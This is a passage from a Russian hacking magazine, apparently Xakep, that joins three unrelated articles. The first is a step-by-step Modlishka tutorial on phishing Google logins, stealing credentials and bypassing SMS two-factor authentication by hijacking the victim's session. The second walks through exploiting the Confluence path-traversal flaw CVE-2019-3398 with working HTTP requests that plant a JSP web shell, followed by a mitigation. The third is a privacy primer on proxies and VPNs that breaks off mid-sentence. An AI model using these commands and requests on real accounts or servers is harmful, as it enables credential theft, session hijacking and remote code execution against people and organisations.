$ apt‐get install golang

Следом указываем путь к директории исходни ков:


$ export GOPATH='/root/go'

Проверить все можно командой


$ go env

В выводе должен быть ука зан GOPATH.





                      Вывод команды

Затем клонируем ветку с инс трументом.


$ go get ‐u github.com/drk1wi/Modlishka
$ cd /root/go/src/github.com/drk1wi/Modlishka/

Создаем сертификат:


$ openssl genrsa ‐out secret.key 2048
$ openssl req ‐x509 ‐new ‐nodes ‐key secret.key ‐sha256 ‐days 1024
‐out cert.pem

Теперь необходимо перенести содержимое клю ча и сертификата в файл
plugin/autocert.go и заменить зна чение двух переменных:
 • const CA_CERT — значение сертификата (файл pem);
 • const CA_CERT_KEY — значение ключа (файл key).





            Файл autocert.go после замены сертификата

Теперь собираем все это дело:


$ make

Занимает компиляция от трех до десяти минут в зависимости от количес тва
вычислительных ресурсов.
  Сам запускаемый файл находится в директории dist/ под названием
proxy. Для проверки можно запустить с ключом ‐h — вывод справки.


$ ./dist/proxy ‐h





              Вывод справки программы Modlishka


ЛОВИМ УЧЕТНЫЕ ДАННЫЕ И СЕССИЮ ЖЕРТВЫ
Как я писал выше, чтобы соз дать проз рачный для жертвы шифрованный канал
до нашего реверс‐прокси, необходимо сперва экспортировать в браузер
сертификат. Дальнейшие действия раз бираются на примере Mozilla Firefox
x64 v. 67.0.
  Перед запуском взглянем внимательно на содержимое еще одного файла
в директории templates. Нам интересен google.com_gsuite.json. Подробное
описание каждого пункта можно найти в гай де по этому конфигу.





            Содержимое файла google.com_gsuite.json

Есть два варианта запуска Modlishka: вручную и с помощью конфигурацион‐
ного файла. Для запуска вручную минимальная команда выглядит так:


$ ./dist/proxy ‐target https://google.com ‐phishingDomain loopback.
modlishka.io ‐listeningPort 443 ‐tls

Запуск с использованием конфигурационного фай ла:


$ ./dist/proxy ‐config /templates/google.com_gsuite.json

Запустим из конфига и перейдем в браузере по адре су loopback.modlish‐
ka.io. Нам откроется стра ница google.com. Вхо дим в аккаунт и видим, как в
выводе терминала появляются учетные данные жертвы.





                Логин и пароль в выводе Modlishka

Если  перейти  по  адресу  loopback.modlishka.io/SayHello2Modlishka
(очень символично), то получим консоль управления перехваченной сессией
(в данный момент это бета‐функция). На данном эта пе мы перехватили логин
и пароль жертвы безо всяких ошибок с шифрованием и в «защищенном»
соединении. Насколь ко мне известно, другие инс трументы аналогичного наз‐
начения такого не умеют.
   Что же теперь делать с двухфакторной аутентификацией? А вот что:
в панели управления есть незаполненное поле UUID, и эта цифра — ключ
ко всему.
   Если сразу нажать на кнопку Impersonate user (beta), то откроется пустая
вкладка, и в консоли Modlishka нам подска жет, что нет UID пользователя. Его
необходимо задать, а задается он в самом начале — указывается в ссылке
на наш злой URL. Для этого вернемся к конфигура ционному файлу.
  Нам интересна строка "trackingParam": "ident". В ней необ ходимо
задать значение ident, чтобы наш URL выглядел следующим образом:


https://loopback.modlishka.io/?ident=1

Именно на такой (или дополнительно обфусцированный) URL необходимо
направить жертву.
  На этот раз, после перехо да и авторизации по такой ссылке, в панели
управления (loopback.modlishka.io/SayHello2Modlishka) будет доступна
сессия с заполненным UUID. Как именно это выглядит, я покажу чуть позже
на реальном примере.
   Теперь при нажатии на большую жел тую кнопку мы увидим красивую
синюю анимацию и через пять‐десять секунд попадем в авторизованную сес‐
сию жертвы, невзирая на трудности двухфакторной авторизации. Жертва,
как обычно, получит и введет подтвержда ющий код, видя зашифрованное
соединение и настоящую панель авториза ции Google, но не замечая вкли‐
нившегося посередине реверс‐прокси Modlishka.
   Хоть я и привел Wiki по всем параметрам конфигурационного файла, есть
еще один момент. После того как жертва ввела учетные данные, желательно
предотвратить выход из акка унта и сохранить авторизованную сессию.
Это делает параметр terminateTriggers. Если в этом параметре указать
URL, на который попадет пользователь пос ле успешной авторизации, то
при появлении такого адреса весь тра фик начнет перенаправляться на ори‐
гинальный URL, а авторизованная сессия не будет тронута даже пос ле
выхода из аккаунта.


ГОТОВЫЙ КОМПЛЕКТ ЗА NAT
Атаковать внутри одной машины или ЛВС ока залось не так сложно, а вот
с подготовкой в качестве PoC «боево го» стенда в WWW у меня поначалу выш‐
ла заминка. Для него понадобится либо перенап равление на белый (внеш‐
ний) IP‐адрес, либо выделен ный сервер с таким адресом. Арендовать сервер
можно от 300 рублей в месяц. Для тестов я брал тут.


             INFO

                        Когда я поднимал этот сервер на Kali Linux, проб‐
                     лем не было. На VDS сто яла Ubuntu Server 16.4,
                      и при установке Golang оказалось, что в ука зан‐
                      ных по умолчанию репозиториях лежит очень ста‐
                       рая версия Go, которая при компиляции выдава‐
                       ла массу ошибок. В таком случае необ ходимо
                       добавить  актуальные репозитории Go и  уста‐
                        новить свежую версию.


Первая проблема заключа ется в доменном имени. Если перейти с компьюте‐
ра жертвы на URL loopback.modlishka.io, то ничего не выйдет,  так
как внешние и неподконтрольные нам DNS не знают такого адре са. Если же
перенаправить на IP‐адрес машины с Modlishka, то жертва попадет прямиком
на страницу Google, минуя прокси‐сервер, а в выводе терминала увидим две
строки:



  Host 192.168.1.15 does not contain the phishing domain
  Redirecting client to google.com


Если жертва в той же локальной сети, то мож но задать соответс твие IP — URL
в местном DNS или в ее файле hosts. В моем случае это было так:


192.168.1.15 loopback.modlishka.io

В интерне те я сначала попробовал зарегистрировать бесплатный домен 3‐го
уровня. Предполагал, что это го хва тит, но не тут‐то было! При переходе ока‐
зывалась лишь страница, что сайт недоступен, а при вводе IP‐адре са через
HTTPS редиректило на Google. По прос тому HTTP и вовсе откры валась при‐
ветственная страница Apache.
   Как обычно, дьявол кро ется в деталях. При перехо де по URL в глобальной
сети автоматом добавляется префикс www, а программа ждала чистого обра‐
щения к домену. Добавление www в конфиг не помогло, и пришлось добывать
в свои владения пол ный пул поддоменов. Дру гими словами, если домен выг‐
лядит    как    loopback.modlishka.io ,    то    иметь    необходимо
*.loopback.modlishka.io .
  Следующая загвоздка касается сертификатов. Необ ходимо на зарегис‐
трированный домен сделать сертификат и ключ. В идеале необходимо под‐
писывать сертификат в удостоверяющем центре, но для тес та можно исполь‐
зовать и самоподписанный.
  Идем на любой генера тор сертификатов, делаем и скачиваем два файла.
Их содержимое надо подставить в конфигура ционный файл Modlishka соот‐
ветственно полям "cert": "" и "certKey": "". Небольшая ремарка: сер‐
тификат и ключ дол жны ука зывать ся в одну строку, а перенос строки,
как обычно, задается пос ледова тельностью \n.
  Выглядеть должно примерно так:


"cert": "‐‐‐‐‐BEGIN CERTIFICATE‐‐‐‐‐\nMIIDJTCCAg2gAwIBAgIESjd
T0DANBgkqhkiG9w0BAQsFADApMScwJQYDVQQDDB5SZWdlcnkgU2Vs\n...".

Также в конфигурационном файле нам необ ходимо изменить пару других
параметров:
 • "phishingDomain": "loopback.modlishka.io" — тут вместо loop
  back.modlishka.io подставляем свой домен;
 • "listeningAddress":  "127.0.0.1" — нужно заменить на 0.0.0.0,
   иначе прослушивается лишь lo‐интерфейс, а работать все будет только
   внутри локальной машины.

Modlishka каждый раз разворачивается для конкретных доменных имен.
Поэтому лучше изначально регистрировать доменное имя, затем получать
сертификат и толь ко потом разворачивать тех ническую часть. В таком случае
можно импортировать содержимое сертификатов в autocert.go, и прописы‐
вать ключ с сертификатом в файл конфигурации уже не потребуется.


ВЗЛОМАТЬ ХАКЕРА
Этот стенд я тестировал с редактором журнала «Хакер» Андреем Василь‐
ковым, который выступал в роли очень наивной жертвы. На google.com адрес
моего домена ничуть не похож, но мы решили пропустить обфускацию.
Об этом уже была отдельная статья, и не одна.
  Результаты совместно го эксперимента можно увидеть на скриншотах.
Андрей находился в другом городе и поэтому ничего не мог мне сде лать под‐
клю чался через другого провайдера, заходя на мой фишинговый сайт через
десктопный Firefox v. 67.0.
  Сначала он скачал поддельный сертификат моего домена (он похож
на домен банка) и установил его в бра узере. В реальной жизни мотивировать
на такой отчаянный пос тупок можно под видом заботы о безопас ности
(хе‐хе), промоакции или сыграть на жадности/страхе тысячью одним дру гим
способом.





                  Жертва ста вит сертификат

В адресной стро ке творится безобразие, но мало кто в нее смотрит (на
мобильных браузерах она вообще скрывает ся для экономии места на экра‐
не). Зеленый замочек «защищенного» соединения все ляет уверенность,
а панель авторизации Google вообще заг ружа ется оригинальная.





                  Ловушка для невнимательных

Первый этап про шел успешно — Андрей ввел свой логин и пароль, после
чего Google отправил ему одноразовый код подтверждения в SMS.





                    Зап рос кода подтверждения

Меньше чем через минуту Андрей вводит его в стандартное поле верифи‐
кации. Он вошел в свой акка унт… и я тоже!





                  Пол ный перехват авториза ции

После этого мне открылась полная сво бода действий. Почта, диск, контакты,
история браузера, история географических перемещений, списки установ‐
ленных приложений, сохраненные пароли точек доступа Wi‐Fi и бэкапы. Прос‐
то цифровой Клондайк!





                        Взло манная поч та

Самое главное — удалось перехватить активную сессию.





                  Панель управления Modlishka

Важное примечание: если акка унт используется на смартфоне, то поль‐
зователю отправится push‐уведомление о том, что был совершен вход в акка‐
унт с нового устрой ства. Однако у хакера есть время вой ти в почту и удалить
это письмо. Для жертвы все будет выг лядеть как глюк системы уведомлений,
если она вообще на него среагирует.


ВЫВОДЫ
Сессия в панели управления Modlishka очень живучая. Она не умирает до тех
пор, пока из нее самой не выйдет пользователь (либо хакер). То есть, если
жертва закроет вкладку, авторизованная сес сия останется активной. Если
заново авторизоваться напрямую на google.com, а потом выйти из аккаунта,
то сессия все равно останется живой. Даже если остановить сервер Modlish‐
ka и запустить его заново — сессия все равно остается. Есть только одна
гарантированная возможность деавториза ции — выйти в тот момент, когда
только «редиректишься» на прокси.
   Хоть в статье и были описаны технические детали, обход 2FA не сработает
без социальной инженерии. Нужно замас кировать сайт и как‐то установить
сертификат на компьютер жер твы. Впрочем, это может оказаться не так уж
сложно. Большинство пользователей охотно выполняют инструкции, начина‐
ющиеся со слов «отключите антивирус и фай рвол», а уж в установке сер‐
тификата мало кто из обывателей увидит потенциальную опасность.


        WWW

                         •Phishing with Modlishka
                         •Phishing NG
                     •Рекомендации по предотвращению MITM‐атак
ВЗЛОМ

   СЛИВАЕМ
 CONFLUENCE

        КАК ЭКСПЛУАТИРОВАТЬ
         PATH TRAVERSAL И RCE
       В КОРПОРАТИВНОЙ ВИКИ





                                                                                     aLLy
                                                                                 ONsec
                                                                                             @iamsecurity





В Conﬂuence, популярной корпоратив ной системе для орга‐
низации знаний, наш ли серьезную уязвимость. Злоумыш‐
ленник может сохранять файлы на целевой системе, а затем
и выполнять произвольный код. Учитывая, что в Conﬂuence
обычно хранят важнейшие данные, проблема может иметь
самые серьезные последствия. Но даже если ты не планиру‐
ешь заниматься промыш ленным шпиона жем, разоб рать эту
уязвимость будет небесполезно.


Баг в конце марта обна ружил латвийский исследователь Янис Крустс (Jānis
Krusts) из IT Centrs. Ей присвоили номер CVE‐2019‐3398. Баг сводится к тому,
что отсутствие фильтрации имен файлов в DownloadAllAttachmentsOnPage‐
Action дает возможность ата кующему выйти из вре менной директории
и записать файл с произвольным содержимым в любую папку, доступную
для записи.
  Для проведе ния атаки требуется учетная запись с правами создания
и редактирования записей. Уязвимы мно жес тво версий в разных ветках при‐
ложения. Все, что вышло аж с Conﬂuence 2.0.0 вплоть до Conﬂuence 6.6.12,
уязвимо. Также проб лемными ока зались версии с 6.7.0 до 6.12.3, версии
с 6.13.0 по 6.13.3, с 6.14.0 до 6.14.2 и с 6.15.0 по 6.15.2 включительно. Более
детальный список можно посмотреть в официальной базе знаний.


СТЕНД
У Conﬂuence простой инсталлятор, который работает в большинс тве сов‐
ременных операционных систем. Для тестов я возьму Conﬂuence 6.9.0. Если
в качестве основной ОС у тебя Windows, то можно вос пользоваться инстал‐
лятором. Однако я рекомендую более универ сальный метод — запустить
контейнер Docker. Не забывай прокидывать необ ходимые порты.


$ docker run ‐‐rm ‐‐name=confluence.vh ‐‐hostname=conflvh ‐p 8090:
8090 ‐p 8091:8091 atlassian/confluence‐server:6.9.0

Инсталлируем приложение.





                  Установка Atlassian Conﬂuence 6.9.0

Далее создаем администратора системы. Для тес тирования уязвимос ти нам
понадобится пользователь с возможностью загружать аттачи. Создаем его,
и стенд готов.





                   Готовый стенд с Conﬂuence 6.9.0


ДЕТАЛИ УЯЗВИМОСТИ CVE-2019-3398
Как ты уже знаешь, проб лема кроется в загрузке всех прикрепленных
к записи файлов. Создадим произвольную запись и загрузим к ней нес колько
файлов.





             Загруженные файлы к посту блога в Conﬂuence

Обрати внимание на кнопку Download  All — она скачивает все фай лы.
Перед этим они любезно упа ковывают ся в ZIP, который и отправляется поль‐
зователю. В моем случае ссылка имеет вид http://confluence.vh:8090/
pages/downloadallattachments.action?pageId=65601. Из названия экше‐
на видно, что за скачива ние отвечает класс DownloadAllAttachmentsOn‐
PageAction. Он расположен в файле confluence/WEB‐INF/lib/conflu‐
ence‐6.9.0.jar. Для декомпиляции я вос пользуюсь утилитой JD‐GUI вер‐
сии 1.5.


/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
01: package com.atlassian.confluence.pages.actions;
02:
...
18: public class DownloadAllAttachmentsOnPageAction extends Abstra
ctPageAwareAction {
19:   AttachmentManager attachmentManager;

Чтобы сразу определить, где конкретно проб лема, можно заглянуть в этот же
файл, только в пропатченной версии, например 6.12.4.


/confluence-
6.12.4/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
19: public class DownloadAllAttachmentsOnPageAction extends Abstra
ctPageAwareAction {
20:   AttachmentManager attachmentManager;
...
32:   public String execute() throws Exception {
33:     List<Attachment> latestAttachments = this.attachmentManager.
getLatestVersionsOfAttachments(getPage());
34:     for (Attachment attachment : latestAttachments) {
35:       File tmpFile = new File(getTempDirectoryForZipping(),
ConfluenceFileUtils.extractFileName(attachment.getFileName()));


/confluence-
6.9.0/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
18: public class DownloadAllAttachmentsOnPageAction extends Abstra
ctPageAwareAction {
19:   AttachmentManager attachmentManager;
...
31:   public String execute() throws Exception {
32:     List<Attachment> latestAttachments = this.attachmentManager.
getLatestVersionsOfAttachments(getPage());
33:     for (Attachment attachment : latestAttachments) {
34:       File tmpFile = new File(getTempDirectoryForZipping(),
attachment.getFileName());

Как видишь, вто рой параметр, который отвечает за имя аттача, в новой вер‐
сии метода execute филь тру ется при помощи extractFileName.


/confluence-
6.12.4/com/atlassian/confluence/util/io/ConfluenceFileUtils.java
82:   public static String extractFileName(String pathname) {
83:     if (pathname == null)
84:       return null;
85:     return (new File(pathname)).getName();
86:   }

Значит, проблема в имени. Пос мотрим на содержимое класса DownloadAl‐
lAttachmentsOnPageAction, а именно метод execute.


/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
31:   public String execute() throws Exception {
32:     List<Attachment> latestAttachments = this.attachmentManager.
getLatestVersionsOfAttachments(getPage());
33:     for (Attachment attachment : latestAttachments) {

Сначала данные всех файлов попадают в массив latestAttachments, затем
функция for перебирает его элементы и читает содержимое каждого фай ла.
Обрати внимание, что создается объект типа File. Он указывает на времен‐
ный файл, имя которого эквивалентно имени аттача.


/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
34:       File tmpFile = new File(getTempDirectoryForZipping(),
attachment.getFileName());
35:       inputStream = this.attachmentManager.getAttachmentData(
attachment);


/com/atlassian/confluence/pages/Attachment.java
31: public class Attachment extends SpaceContentEntityObject implem
ents SearchableAttachment, Addressable, HasLinkWikiMarkup, Conten
tConvertible, Contained<ContentEntityObject> {
32:   public static final String PROP_MEDIA_TYPE = "MEDIA_TYPE";
...
75:   @Nonnull
76:   public String getFileName() { return getTitle(); }


/com/atlassian/confluence/core/ContentEntityObject.java
056: public abstract class ContentEntityObject extends Abstra
ctLabelableEntityObject implements Searchable, Comparable, Addres
sable, Content, RelatableEntity {
057:   public static final String CURRENT = "current";
...
153:   public String getTitle() { return this.title; }

Также создается временная директория для хра нения всех необходимых
для сжатия документов.


/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
18: public class DownloadAllAttachmentsOnPageAction extends Abstra
ctPageAwareAction {
...
81:   private File getTempDirectoryForZipping() throws IOException {
82:     if (this.tempDirectoryForZipping == null) {
83:       this.tempDirectoryForZipping = new File(getConfluenceTe
mpDirectoryPath() + File.separator + getZipFilename());
84:       if (!this.tempDirectoryForZipping.exists()) {
85:         if (this.tempDirectoryForZipping.mkdirs())
86:           return this.tempDirectoryForZipping;
87:         throw new IOException("Could not create directory: " +
this.tempDirectoryForZipping.getPath());
88:       }
89:     }
90:     return this.tempDirectoryForZipping;
91:   }

Эта папка находится по пути, который задан настройкой webwork.multi‐
part.saveDir.


/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
93:   private String getConfluenceTempDirectoryPath() throws Except
ion { return getBootstrapManager().getFilePathProperty("webwork.
multipart.saveDir"); }

По дефолту это папка temp, в корне рабочей директории Conﬂuence.


/com/atlassian/confluence/setup/actions/SetupStartAction.java
19: public class SetupStartAction extends AbstractSetupAction implem
ents BootstrapAware {
...
73:   private boolean setupConfluenceHome() {
...
74:     String localHomeDir = "${localHome}" + System.getProperty(
"file.separator");
...
76:     String confluenceTempDir = localHomeDir + "temp";
...
82:       bootstrapManager.setProperty("webwork.multipart.saveDir",
confluenceTempDir);

Имя папки генерируется по шаблону:


download<5_рандомных_цифр_букв><час><минута><секунда>

Например, это может быть download2d2s3171652.zip.


/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
95:   private String getZipFilename() throws Exception {
96:     if (this.zipFilename == null)
97:       this.zipFilename = MessageFormat.format("download{0}{1,
time,HHmmss}", new Object[] { RandomGenerator.randomString(5), new
Date() });
98:     return this.zipFilename;
99:   }

После того как временный файл создан, в него переносится содержимое
прикрепленного файла.


/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
37:       try {
38:         fileOutputStream = new FileOutputStream(tmpFile);
39:         throwable1 = null;
40:         try {
41:           ByteStreams.copy(inputStream, fileOutputStream);
...
49:                 fileOutputStream.close();
...
64:               inputStream.close();

Когда все аттачи обработаны, временная пап ка запаковывается в архив
и отдается клиенту.


/com/atlassian/confluence/pages/actions/DownloadAllAttach-
mentsOnPageAction.java
73:     File zipFile = new File(getConfluenceTempDirectoryPath() +
File.separator + getZipFilename() + ".zip");
74:     FileUtils.createZipFile(getTempDirectoryForZipping(), zipFile
);
75:     FileUtils.deleteDir(getTempDirectoryForZipping());
76:     this.downloadPath = prepareDownloadPath(zipFile.getPath()) +
"?contentType=application/zip";
77:     this.gateKeeper.addKey(prepareDownloadPath(zipFile.getPath())
, getAuthenticatedUser());
78:     return "success";

Таким образом, если получится манипулировать именем файла, то можно
будет создать файл в произвольном месте, куда раз решена запись. Первое,
что приходит на ум, — попробовать вста вить конс трукцию ../ при загрузке
файла. Однако такой фокус не пройдет, так как по дефол ту используется
обработчик JakartaMultiPartRequest, а он выполняет фильтрацию имен
загружаемых аттачей с помощью метода getCanonicalName.


/com/atlassian/confluence/pages/actions/AttachFileAction.java
24: public class AttachFileAction extends ConfluenceActionSupport
implements ServletRequestAware, Beanable {
...
74:   public String execute() {
75:     AttachmentUploadRequest uploadRequest = new AttachmentUploa
dRequest((MultiPartRequestWrapper)this.request);




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
СЛИВАЕМ CONFLUENCE
              КАК ЭКСПЛУАТИРОВАТЬ PATH TRAVERSAL
                 И RCE В КОРПОРАТИВНОЙ ВИКИ





/com/atlassian/confluence/pages/actions/AttachmentUpload-
Request.java
12: public class AttachmentUploadRequest {
13:   private List<AttachmentResource> resources;
...
15:   public AttachmentUploadRequest(MultiPartRequestWrapper request)
 throws IllegalStateException {
16:     if (request.hasErrors())
17:       throw new IllegalStateException("Client should check for
errors in the multi‐part request");
18:     this.resources = toUploadedResources(request);
19:   }
...
21:   private static List<AttachmentResource> toUploadedResources(
MultiPartRequestWrapper request) {
22:     List<String> fileParameterNames = Collections.list(request.
getFileParameterNames());
23:     List<AttachmentResource> result = new ArrayList<Attach
mentResource>();
...
26:       String[] filenames = request.getFileNames(parameterName);


/com/atlassian/confluence/setup/webwork/JakartaMultiPartRequest.-
java
113:   public String[] getFileNames(String fieldName) {
...
120:     for (int i = 0; i < items.size(); i++) {
121:       DiskFileItem fileItem = (DiskFileItem)items.get(i);
122:       fileNames.add(getCanonicalName(fileItem.getName()));


/com/atlassian/confluence/setup/webwork/JakartaMultiPartRequest.-
java
159:   private String getCanonicalName(String filename) {
160:     int forwardSlash = filename.lastIndexOf("/");
161:     int backwardSlash = filename.lastIndexOf("\\");
162:     if (forwardSlash != ‐1 && forwardSlash > backwardSlash) {
163:       filename = filename.substring(forwardSlash + 1, filename.
length());
164:     } else if (backwardSlash != ‐1 && backwardSlash >= forwar
dSlash) {
165:       filename = filename.substring(backwardSlash + 1, filename.
length());
166:     }
167:     return filename;
168:   }

В результате остается лишь часть пос ле последнего слеша.
   Также можно менять имя файла прямо в интерфейсе редактирования
аттача, но и там запрещены раз личные спецсимволы.


/com/atlassian/confluence/pages/actions/MoveAttachmentAction.java
033: public class MoveAttachmentAction extends AbstractPageAwa
reAction implements BootstrapAware, ContentDetailAction, Breadc
rumbAware {
...
048:   private static final char[] INVALID_CHARS = { '\\', '/', '"',
':', '?', '*', '<', '|', '>' };
...
110:   public void validate() {
...
114:     if (StringUtils.containsAny(this.newFileName, INVALID_CHARS)
)
115:       addFieldError("rename", getText("filename.contain.invalid.
character"));





  Неудачная попытка path traversal через редактирование име ни фай ла
  аттача в Conﬂuence

Но есть место, где филь тра ция начисто отсутству ет. Это загрузка через пла‐
гин drag‐and‐drop. Например, он используется при добавлении файла пря‐
мо в редакторе контента.





              Прикрепление файла к записи в редакторе

Путь к самому jar — /confluence/WEB‐INF/atlassian‐bundled‐plugins/
confluence‐drag‐and‐drop‐6.9.0.jar.


/com/atlassian/confluence/plugins/dragdrop/UploadAction.java
33: public class UploadAction extends ConfluenceActionSupport implem
ents Beanable, ServletRequestAware {
...
70:   public void validate() {
71:     super.validate();
72:     if (StringUtils.isBlank(this.filename))
73:       addActionError(getText("upload.filename.cannot.be.blank"));
74:     long maxUploadSize = this.settingsManager.getGlobalSettings()
.getAttachmentMaxSize();
75:     if (this.size > maxUploadSize) {
76:       ServletActionContext.getResponse().setStatus(413);
77:       String error = getText("upload.size.limit.exceeded", Immuta
bleList.of(FileSize.format(this.size), FileSize.format(maxUploadSize
)));
78:       addActionError(error);
79:     }
80:   }
...
122:       InputStream inStream = getStreamForEncoding(this.httpSe
rvletRequest);
123:       this.fileUploadManager.storeResource(new InputStreamAtta
chmentResource(inStream, this.filename, this.mimeType, this.size,
null, this.minorEdit), content);

Как видишь, проверок  тут немного, и имя фай ла попадает в систему
без какой‐либо фильтра ции.
  Перехватываем пакет на заг рузку файла и меняем параметр filename.


POST /plugins/drag‐and‐drop/upload.action?pageId=65601&
filename=../../dummy.txt&size=1&minorEdit=true&spaceKey=VIS&
mimeType=text%2Fplain&atl_token=e1c7ebd71a275bd60862b8639b49043d2
d820c3c&name=dummy.txt HTTP/1.1
Host: confluence.vh:8090
Content‐Length: 1
Content‐Type: application/octet‐stream
Accept: */*


1





       Запрос на прикрепление файла через плагин drag‐and‐drop

Файл успешно прик репился. Посмотрим, как это выглядит в интерфейсе.





         Path traversal в Conﬂuence через имя прикрепляемого файла

После нажатия кнопки Download All в рабочей директории Conﬂuence будет
создан файл dummy.txt c указанным при загрузке содержимым.
   Дальше уже тебе решать, как использовать най денную уязвимость. Если
знаешь, где расположен веб‐рут Conﬂuence, то считай, что RCE у тебя в кар‐
мане. В контейнере Docker по дефолту это /opt/atlassian/confluence/
confluence. Владельцем почти всех папок и файлов является пользователь,
от имени которого запущен веб‐сервер Tomcat.





  Владелец файлов и поль зователь, от имени которого запущен Apache
  Tomcat, один и тот же

Поэтому берем любой JSP‐шелл, например Laudanum JSP Shell, и через баг
загружаем его по указанному выше пути.


POST /plugins/drag‐and‐drop/upload.action?pageId=65601&
filename=../../../../../../../../../opt/atlassian/confluence/conflu
ence/dummy.jsp&size=1&minorEdit=true&spaceKey=VIS&
mimeType=text%2Fplain&atl_token=e1c7ebd71a275bd60862b8639b49043d2
d820c3c&name=dummy.txt HTTP/1.1
...

Осталось только нажать на кнопку для соз дания архива, чтобы получить
рабочий веб‐шелл. Переходим по URL http://conﬂuence.vh:8090/dummy.jsp
и наблюдаем окно для вво да команд.





  Успешная эксплуатация RCE‐уязвимос ти через path traversal
  в Conﬂuence


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАЩИТА
Как ты понимаешь, уязвимость более чем серьезная: недобросовестный
или скомпрометированный сотрудник может с легкостью получить доступ
к серверу Conﬂuence. Если в твоей компании стоит уязвимая версия, то
как можно скорее обновляй ее на пропат ченную. Если же это почему‐то
невозможно, то восполь зуйся временным решением — можешь заблокиро‐
вать экшен загрузки всех атта чей. Для этого нужно остановить сервер Conﬂu‐
ence и отредактировать файл <confluence_dir>/conf/server.xml, добавив
в него строки:


<Context path="/pages/downloadallattachments.action" docBase="" >
    <Valapp className="org.apache.catalina.valapps.RemoteAddrValapp"
deny="*" />
</Context>

После этого загрузка архива с прикреплен ными файлами станет недос‐
тупной, при этом отдельная загрузка каж дого атта ча по‐прежнему будет
работать.
ПРИВАТНОСТЬ


  КРАТКИЙ СПРАВОЧНИК
 АНОНИМА





                                      Михаил Киреев
                                               kireevmp@yandex.ru

    ВИДЫ ШИФРОВАНИЯ И ЗАЩИТЫ
        ТРАФИКА, ВЫБОР СОФТА





Неважно, по каким причинам ты решил шифровать то, что
пересылаешь через интернет. Это может быть забота о сек‐
ретности личных дан ных, попытка обойти запреты  того
или иного государства или другие мотивы. В современ ном
мире простым людям доступен неплохой выбор криптостой‐
ких шифрованных протоколов и программ, которые  их
реализуют. В этой статье мы пройдемся по всем классам
таких решений (пусть многие из них и широко известны),
обсудим надежность и посмотрим, какие доступны реали‐
зации.


ПРОКСИ-СЕРВЕРЫ
Прокси‐серверы — самый дос тупный способ анонимизировать трафик: они
дешевы и широко распростра нены. Их прин цип работы очень прост: прок‐
си — это почтальон, который доставляет конверты с письмами вместо тебя,
аккуратно стирая имя отправителя, и воз вра щает ответ лично тебе в руки.
  Изначально эта технология была призвана защищать внутренние кор‐
поративные сети от остального интернета (сот рудники получали доступ
из внутренней сети в интернет через шлюз), но стала исторически первым
способом анонимизировать трафик.





                   Схема работы прокси‐сервера

Работая через прок си, компьютер все свои запросы перенаправля ет через
посредника (прокси‐сервер), и уже пос редник, представляясь твоим компь‐
ютером, запрашивает данные у сайтов. Прокси‐серверы узкоспециализиро‐
ваны, поэтому на каждый тип интернет‐соединения имеется свой тип прокси.
Например, для FTP (File Transfer Protocol) есть FTP‐прокси. Подробно мы раз‐
берем три типа прок си‐серверов.
  HTTP и HTTPS могут работать толь ко с запросами HTTP, а вся разница
между ними в том, что HTTPS шифрует передаваемые данные, а HTTP — нет.
Поэтому прокси HTTP не рекомендуют ся к поль зованию, они могут лишь
менять адрес IP, а данные защитить они нес пособны. Также будь осторожен
с выбором самого прокси‐сервера, так как некото рые не только не защитят
твои данные, но и могут рас крыть личность.


             INFO

                   Обращай внимание на тип сервера — transparent
                          proxy или anonymous  proxy. Первые не будут
                      скрывать твою личность!


Использовать такой прокси несложно: найди в интернете или соз дай сервер,
которому сможешь доверять, и, открыв нас тройки браузе ра (дос туп к сети),
введи данные.
  Тип SOCKS применяется в тех приложениях, которые либо не используют
HTTP и HTTPS, либо не имеют встро енной поддержки прокси‐серверов.
В отличие от предыдущего типа, этот апри ори не будет публиковать твой IP,
поэтому об анонимности можно не бес покоить ся. Однако SOCKS сам
по себе не пре доставляет никакого шифрования, это лишь транспортный
протокол. Чтобы применять его, есть, например, ути лита Shadowsocks.
  SOCKS4 и SOCKS5 —  это раз ные версии серверов. Убедительно
рекомендую исполь зовать пятую версию, так как она име ет много воз‐
можностей и более безопас на. Например, поддержи вает использование
логина и пароля, запросы DNS. А лучше даже использовать Shadowsocks —
это SOCKS5 на стероидах. Тут есть и мощное шифрование, и скрытие тра‐
фика, и возможность обходить раз личные блокировки. Есть клиенты как для
компьютера, так и для смартфона, позволяющие оставаться под защитой
постоянно.
   Чтобы начать использовать SOCKS в привычных программах, не нужно
ничего особенного. В Firefox и μTorrent эта функция встроена и дос тупна
в настройках. Для Google Chrome есть рас ширение Proxy Helper. Можно вос‐
пользоваться универ сальными прог рамма ми вроде SocksCap или ProxyCap.
  Список множества бесплатных HTTP, HTTPS и SOCKS прокси‐серверов
можно найти либо с помощью поиска, либо в Википедии.


VPN
VPN (Virtual Private Network — виртуальная частная сеть) также изначально
не задумывалась как средство защиты и анонимизации трафика. Ее задачей
было объединить компь ютеры в единую сеть, даже если они находятся
за множество километров друг от дру га. Ключевой особенностью стало то,
что соединения VPN всегда защищались шифрованием, так как исполь‐
зовались  в корпорациях и позволяли подклю чать несколько филиалов
к головному офису.
  VPN имеет два режима: объединение двух локаль ных сетей между собой
через интернет и подключение отдельного компь ютера к удаленной локаль‐
ной сети (удаленный доступ). Пос ледний и пос лужил основой для неком‐
мерческого, персонального варианта. Защита данных в соеди нении VPN пре‐
доставляется двумя техниками, которые зачас тую используются вмес те:
 • PPP (Point‐to‐Point Protocol) использует ся для защиты на уровне канала
   данных, то есть на самом низком из воз можных. Его задача — обеспечить
   стабильное соединение между двумя точками в интернете, а также пре‐
   доставить шифрование и аутентифика цию.
 • PPTP (Point‐to‐Point Tunneling Protocol) является расширением и допол‐
   нением PPP. Для работы это го про токола уста навливается два соеди‐
   нения — основное и управляющее.

Из‐за того что придуман этот протокол был в далеком 1999 году его безопас‐
ность оставляет желать лучшего. Ни один из методов шифрования, работа‐
